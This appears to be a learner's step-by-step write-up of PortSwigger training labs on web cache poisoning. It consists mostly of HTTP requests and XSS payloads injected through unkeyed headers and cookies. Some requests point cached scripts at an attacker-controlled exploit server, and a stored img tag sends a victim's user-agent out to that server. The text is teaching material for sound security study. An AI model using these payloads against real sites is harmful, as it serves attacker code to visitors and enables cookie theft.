# Web cache poisoning
https://portswigger.net/web-security/web-cache-poisoning

# Exploiting cache design flaws
https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws

# 1. Lab: Web cache poisoning with an unkeyed header
https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-with-an-unkeyed-header

To solve this lab, poison the cache with a response that executes alert(document.cookie) in the visitor's browser. 

hint:
This lab supports the X-Forwarded-Host header. 


we see that **GET /resources/labheader/js/labHeader.js HTTP/1.1** points to:**/resources/images/tracker.gif?page=post**:

```htm
document.write('<img src="/resources/images/tracker.gif?page=post">');
```

lets find the gif in proxy (remember to check the **images** box in **filter setting window**) and try to poison it:

# request 1
```
GET /?random=123 HTTP/1.1
Host: 0ae800e5030b5cc1c044696400a20002.web-security-academy.net
Cookie: session=BrC4uOqxzpKHTCqHph2yyEjNng19qHM0
X-Forwarded-Host: kraken.com
```
**response:**
```
HTTP/1.1 200 OK
..
..       
       <script type="text/javascript" src="//kraken.com/resources/js/tracking.js"></script>
```

2. try again without the cash buster: if the response includes the kraken.com adress we have auccsessfuly poisoned the cache.

3. go to exploit server and change the exploit path to fit the suffix inserted by server: **/resources/js/tracking.js** abnd at the page body we write the command: **alert(document.cookie)** and store the finished page.

final payload will be:
# request 2
```
GET /?random=123 HTTP/1.1
Host: 0ae800e5030b5cc1c044696400a20002.web-security-academy.net
Cookie: session=BrC4uOqxzpKHTCqHph2yyEjNng19qHM0
X-Forwarded-Host: exploit-0a7600df03115cb1c00969a401b100d7.exploit-server.net
```
**response:**
```
HTTP/1.1 200 OK
..
..       
       <script type="text/javascript" src="//exploit-0a7600df03115cb1c00969a401b100d7.exploit-server.net/resources/js/tracking.js"></script>
```

4. after testing without the cash buster we go to the site homepage and see the cached pop-up

# Done!

# ***2. Lab: Web cache poisoning with an unkeyed cookie***
https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-with-an-unkeyed-cookie

to solve this lab, poison the cache with a response that executes alert(1) in the visitor's browser. 

1. exaining homepage request :
```
GET / HTTP/1.1
Host: 0abf002b03bdda54c01a312400ff002a.web-security-academy.net
Cookie: session=Gy4WP8cRRGXVybJQ8PFsiEsIPaAdQ7k1; fehost=prod-cache-01
..
```
we discover cookie parameter reflected in the response:
```
       <script>
            data = {
                "host":"0abf002b03bdda54c01a312400ff002a.web-security-academy.net",
                "path":"/",
                "frontend":"prod-cache-01"
            }
        </script>
```
2.  observe  cache parameter:
```
Cache-Control: max-age=30
Age: 0
X-Cache: miss
```

3. inserting arbitary code will reflect so lets break out of the syntax to pop alert:
```
x"};alert(1);{"
```
(remember to urlencode:)
```
x"}%3balert(1)%3b{"
```

# POP!

# ***Lab: Web cache poisoning with an unkeyed header***
https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-with-an-unkeyed-header

To solve this lab, poison the cache with a response that executes alert(document.cookie) in the visitor's browser. 

hint: This lab supports the X-Forwarded-Host header. 

1. lets add header to homepage request:
```
GET / HTTP/1.1
Host: 0a32008a047d5867c0428729008000e6.web-security-academy.net
X-Forwarded-Host: test
```
lets look for our test paylkoad. observe reflection:
```
       <script type="text/javascript" src="//test/resources/js/tracking.js"></script>
            <script src="/resources/labheader/js/labHeader.js">
```

2. breakout of syntax and add to X-Forwarded-Host:
```
X-Forwarded-Host: "></script><script>alert(document.cookie)</script>//
```

# POP

# ***3. Lab: Web cache poisoning with multiple headers***
https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-with-multiple-headers

To solve this lab, poison the cache with a response that executes alert(document.cookie) in the visitor's browser. 

**Hint**: This lab supports both the X-Forwarded-Host and X-Forwarded-Scheme headers.

1. while **x-forwarded-scheme** initiate redirect back to the host, the **x-forwarded-host** defines the host - so combination of both creates am open-redirection.

2. since we plan to initiate a JS command we find a resource call to poison: 
**GET /resources/js/tracking.js HTTP/1.1**. we add our exploit server adress as follows:
```
GET /resources/js/tracking.js HTTP/1.1
Host: 0a6e009004682711c069848c001b00de.web-security-academy.net
Cookie: session=hFYRyS7STShDt88kwtIthh6PAiqUEkBC
X-Forwarded-Host: exploit-0a9b00410481272ac0c6845e0137009f.exploit-server.net
X-Forwarded-Scheme: http
```
3. on our exploit server we store the alert commend:

```javascript
alert(document.cookie)
```
4. we send the request when cache-age exipres and observbe the pop.

5. on the site we enter any page (since all of them are using this resource) and abserve the pop. we wait for the victim to enter the site

# POP

# ***4.Lab: Targeted web cache poisoning using an unknown header***
https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-targeted-using-an-unknown-header

A victim user will view any comments that you post. 

To solve this lab, you need to poison the cache with a response that executes alert(document.cookie) in the visitor's browser. However, you also need to make sure that the response is served to the specific subset of users to which the intended victim belongs. 

site is being sanitized by **domPurify-2.0.15.js**:
```
GET /resources/js/domPurify-2.0.15.js HTTP/1.1
```

1. we run param-miner and find **x-host** header is available. we add this header to different request and look for reflection. we find one in the requests:
```
GET /post?postId=2 HTTP/1.1
GET / HTTP/1.1
GET /post/comment/confirmation?postId=2 HTTP/1.1
..
..
x-host: test
```
response
```htm
<script type="text/javascript" src="//test/resources/js/tracking.js"></script>
```
2. we break from syntax with payload:
```
x-host: x"></script><script>alert(document.cookie)</script>
```
and test our payload in broser and get response:
```htm
<script type="text/javascript" src="//x"></script><script>alert(document.cookie)</script>/resources/js/tracking.js"></script>
```
**we get a pop!**

now we have a cached xss in the home page, but as the response header **vary: user-agent** implies - this cached-xss attack is limited to a user with the same build as described in user-agent header 

**what is user-agent - material:**
https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/User-Agent

```
User-Agent: <product> / <product-version> <comment>
```
Common format for web browsers:
```
User-Agent: Mozilla/5.0 (<system-information>) <platform> (<platform-details>) <extensions>
```
example:
```
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
```

**aquiring victims user-name with comment**

3. we know user-agent is keyed so we need to figure out our victims user-agent in order for our cached-xss attack to work

exfiltrating the victims useragent: in comment we post a comment with img tag source pointing to exploit server:
```
<img src="https://exploit-0aa200c904fba887c09e034f01e200de.exploit-server.net/user-agent">
```
this is a stored xss to exfiltrate the Victim's user-agent. we check in exploit server log and we see:
```
10.0.4.168      2022-10-08 18:45:16 +0000 "GET /user-agent HTTP/1.1" 404 "User-Agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.61 Safari/537.36"
```
so lets add **User-Agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.61 Safari/537.36** to our cached-xss request:
```
GET / HTTP/1.1
..
User-Agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.61 Safari/537.36
x-host: x"></script><script>alert(document.cookie)</script>
```

# ***5. Lab: Web cache poisoning to exploit a DOM vulnerability via a cache with strict cacheability criteria***
https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-to-exploit-a-dom-vulnerability-via-a-cache-with-strict-cacheability-criteria

To solve the lab, poison the cache with a response that executes alert(document.cookie) in the visitor's browser. 


1. investigate with param-miner:
```
Identified parameter on 0a850006040a4dc5c0fb6750008500a2.web-security-academy.net: x-forwarded-host
```

1. observe in **GET / HTTP/1.1** response:
```htm
       <script>
            data = {
                "host":"0ae000ea03dd34ebc02389ed006e003a.web-security-academy.net",
                "path":"/product",
            }
        </script>
```
with link to loaction source:
```htm
                   <script>
                        initGeoLocate('//' + data.host + '/resources/json/geolocate.json');
                    </script>
```
and a link to a javascript:
```htm
       <script type="text/javascript" src="/resources/js/geolocate.js">
```
examening the **GET /resources/js/geolocate.js HTTP/1.1** response we observe **innerHTML** element which is a possible XSS sink:
```javascript
function initGeoLocate(jsonUrl)
{
    fetch(jsonUrl)
       .then(r => r.json())
       .then(j => {
       ..
       let div = document.createElement("div");
       div.innerHTML = 'Free shipping to ' + j.country;
       geoLocateContent.appendChild(div)
       }
```

2. *Analayze site process:*
**GET / HTTP/1.1** request loads resource (country value) from **/resources/json/geolocate.json** and sends it to **/resources/labheader/js/labHeader.js** where the value is inserted into the **innerHTML** sink

we need to **Step 1** poison the resource so it will fetch our payload as country value **Step 2** craft the payload so it will pop and wait for the victim to visit the site

3. *craft the attack:*
**Step 1**
observe resource format:
```
initGeoLocate('//' + data.host + '/resources/json/geolocate.json');
```
to mimic it we add **x-forwarded-host** (discovered with param-miner)to the **GET / HTTP/1.1**:
```
GET / HTTP/1.1
Host: 0ae000ea03dd34ebc02389ed006e003a.web-security-academy.net
..
x-forwarded-host: exploit-0a62000b03253456c023895e015200ef.exploit-server.net
```
and in our expoloit server we prepare a page with the same path:
```
/resources/json/geolocate.json
```
**together they form a valid address pointing to our payload**


**Step 2** 
copy the original **GET /resources/json/geolocate.json HTTP/1.1** to  exploit server
```
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8

{
    "country": "United Kingdom"
}
```
add **CORS header** and tweak it to include DOM XSS payload (I had to try many untill I found event handler who wasnt being sanitized...):
```
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8
Access-Control-Allow-Origin: *

{
    "country": "<select autofocus onfocus=alert(document.cookie)>"
}

```
4. initiate the attack with **GET / HTTP/1.1** request which will pull our payload from **exploit-server/resources/json/geolocate.json** and serve it to the innerHTML sink at **/resources/labheader/js/labHeader.js**

# POP!


# ***6. Lab: Combining web cache poisoning vulnerabilities***
https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-combining-vulnerabilities

A user visits the home page roughly once a minute and their language is set to English. 

To solve this lab, poison the cache with a response that executes alert(document.cookie) in the visitor's browser. 

1. investigate with param-miner:
```
Identified parameter on 0a850006040a4dc5c0fb6750008500a2.web-security-academy.net: x-forwarded-host~%s.%h
Identified parameter on 0a850006040a4dc5c0fb6750008500a2.web-security-academy.net: origin~https://%s.%h
Identified parameter on 0a850006040a4dc5c0fb6750008500a2.web-security-academy.net: origin
Identified parameter on 0a850006040a4dc5c0fb6750008500a2.web-security-academy.net: x-original-url~/%s
Identified parameter on 0a850006040a4dc5c0fb6750008500a2.web-security-academy.net: x-forwarded-host
Identified parameter on 0a850006040a4dc5c0fb6750008500a2.web-security-academy.net: x-original-url~/%s
Identified parameter on 0a850006040a4dc5c0fb6750008500a2.web-security-academy.net: sec-websocket-version
```
2. in **GET / HTTP/1.1** observe
```
       <script>
            data = {
                "host":"test",
                "path":"/",
            }
        </script>
..        
..
       <script>
              initTranslations('//' + data.host + '/resources/json/translations.json');
       </script>
```

3. use the **x-forwarded-host** to point resource to our domain, and prepare the exploit file in the same path as the format **/resources/json/translations.json** 
